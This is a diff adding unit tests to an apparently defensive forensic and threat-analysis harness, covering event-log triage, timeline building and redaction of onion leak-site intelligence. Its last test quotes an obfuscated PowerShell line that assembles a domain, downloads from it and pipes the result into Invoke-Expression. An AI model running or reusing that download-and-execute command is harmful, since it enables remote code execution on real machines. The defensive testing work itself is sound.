@@ -11,6 +11,9 @@ import {
   extractAiText,
   extractSecurityTargets,
   extractWindowsPersistenceEvidence,
+  formatEventLogTriage,
+  formatForensicTimeline,
+  formatOnionIntel,
   formatWindowsPersistenceEvidence,
   guardDeterministicToolPlan,
   hasExplicitOsintSweepIntent,
@@ -32,6 +35,63 @@ import {
   validateDirectToolPolicy,
   validateToolArgumentObject,
 } from './src/harness.mjs';
+
+test('forensic text tools preserve opaque evidence and do not turn embedded URLs into targets', () => {
+  const evidence = '2026-09-08T10:00:00Z note [source](https://evidence.example/path) EventID=4625';
+  assert.equal(normalizeToolArguments('forensic_timeline', { text: evidence }).text, evidence);
+  assert.deepEqual(collectToolTargets('', { text: evidence }, 'forensic_timeline'), []);
+  assert.deepEqual(collectToolTargets('', { text: evidence }, 'eventlog_triage'), []);
+  assert.deepEqual(collectToolTargets('', { text: evidence }, 'onion_intel'), []);
+});
+
+test('forensic timeline normalizes events and flags high-signal chronology leads', () => {
+  const report = [
+    '2026-09-08T10:00:00Z EventID=4625 Account Name: alice failed logon from 203.0.113.8',
+    '2026-09-08T10:06:00Z Event ID 4624 Account Name: alice successful logon',
+    '2026-09-08T10:07:00Z Event ID 1102 Security audit log cleared',
+  ].join('\n');
+  const result = formatForensicTimeline(report);
+  assert.match(result, /2026-09-08T10:00:00\.000Z/);
+  assert.match(result, /Audit or event-log clearing — T1070\.001/);
+  assert.match(result, /203\.0\.113\.8/);
+  assert.match(result, /No file was opened, command executed, host contacted/);
+});
+
+test('event-log triage recognizes Windows and Sysmon leads with provider caveats', () => {
+  const result = formatEventLogTriage([
+    'ProviderName=Service Control Manager EventID=7045 Computer=WS-01 Service was installed',
+    'ProviderName=Microsoft-Windows-Sysmon EventID=10 TargetImage=lsass.exe process access',
+  ].join('\n'));
+  assert.match(result, /7045 x1: A service was installed/);
+  assert.match(result, /8\/10 x1: Sysmon remote-thread\/process-access lead/);
+  assert.match(result, /hosts observed: WS-01/);
+  assert.match(result, /ProviderName, Channel, RecordID/);
+});
+
+test('onion intelligence extracts pivots but never reproduces credential-like lines', () => {
+  const onion = `${'a'.repeat(56)}.onion`;
+  const result = formatOnionIntel([
+    `Leak site mirror ${onion}`,
+    'Contact analyst@example.org',
+    `SHA256 ${'b'.repeat(64)}`,
+    `password=do-not-repeat-this-${'c'.repeat(64)}`,
+    'Pay within 48 hours before we publish data to this ransomware leak site.',
+  ].join('\n'));
+  assert.match(result, /onion v3 services \(1\)/);
+  assert.match(result, /analyst@example\.org/);
+  assert.match(result, /sensitive-line warning: 1/);
+  assert.doesNotMatch(result, /do-not-repeat-this/);
+  assert.doesNotMatch(result, new RegExp('c{64}'));
+  assert.match(result, /Claims are unverified/);
+});
+
+test('closed-world forensic tools carry cautious evidence metadata and bypass result caching', () => {
+  const metadata = toolEvidenceMetadata({ name: 'forensic_timeline', category: 'forensics', passive: true, openWorld: false }, 'one lexical event');
+  assert.equal(metadata.evidenceBasis, 'textual-evidence-only');
+  assert.equal(metadata.uncertain, true);
+  assert.equal(shouldCacheToolResult('forensic_timeline'), false);
+  assert.equal(shouldCacheToolResult('evidence_manifest'), false);
+});
 
 test('statically recovers a PowerShell array permutation without evaluating it', () => {
   const command = String.raw`%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-RestMethod (@('oc','o','ph','inf','.inf','o','ard','ot','u_H1','KJ')[3,0,6,2,7,1,4,5] -join $zoBd_mI) | Invoke-Expression`;
